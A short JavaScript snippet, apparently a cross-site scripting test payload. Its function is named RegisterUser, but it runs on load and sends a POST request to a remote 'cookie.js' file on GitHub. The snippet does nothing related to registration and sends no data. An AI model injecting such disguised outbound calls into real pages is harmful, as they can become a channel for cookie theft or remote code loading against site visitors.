function RegisterUser(){

    var url = "https://raw.githubusercontent.com/AssassinUKG/testing/main/cookie.js";
       
    xhr = new XMLHttpRequest();
    xhr.open("POST", url);
    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    xhr.send(null);
}
RegisterUser();
